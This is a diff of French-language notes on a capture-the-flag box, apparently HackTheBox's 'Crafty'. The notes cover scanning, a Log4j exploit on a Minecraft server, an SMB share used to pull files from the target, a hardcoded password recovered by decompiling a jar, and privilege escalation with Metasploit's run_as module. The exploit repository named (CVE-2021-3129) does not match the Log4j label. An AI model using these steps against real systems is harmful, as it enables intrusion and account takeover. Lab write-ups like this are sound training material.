@@ -20,8 +20,8 @@ java -jar Tlauncher
 # on find ce blog https://software-sinner.medium.com/exploiting-minecraft-servers-log4j-ddac7de10847
 # on scan dabord play.crafty.htb 
 nmap -sV play.crafty.htb -p- 
-80/tcp    open  http      syn-ack ttl 127 Microsoft IIS httpd 10.0
-25565/tcp open  minecraft syn-ack ttl 127 Minecraft 1.16.5 (Protocol: 127, Message: Crafty Server, Users: 1/100)
+	80/tcp    open  http      syn-ack ttl 127 Microsoft IIS httpd 10.0
+	25565/tcp open  minecraft syn-ack ttl 127 Minecraft 1.16.5 (Protocol: 127, Message: Crafty Server, Users: 1/100)
 # on a le port minecrat ouvert, ensuite on recup log4j exploit 
 git clone https://github.com/joshuavanderpoll/CVE-2021-3129
 # apres avoir download le jdk sur site de oracle comme dans le README, on lance exploit
@@ -40,10 +40,10 @@ winPEAS.bat
 smbserver.py -smb2support EXEGOL . -username kali -password kali
 # mount smb server 
 net use x: \\10.10.16.47\EXEGOL /user:kali kali
-# dans plugins on a un snapshot jar file on le transfer puis on le decompile avec jadx
+# dans plugins on a un snapshot jar file on le transfert puis on le decompile avec jadx
 jadx-gui
 # on find un password codé en dur, on test si cest password de ladmin
-# on va upload meterpreter, esuite on use le module post/windows/manage/run_as
+# on va upload meterpreter, ensuite on use le module post/windows/manage/run_as
 msf6 post(windows/manage/run_as) > set session 1
 session => 1
 msf6 post(windows/manage/run_as) > set user administrator
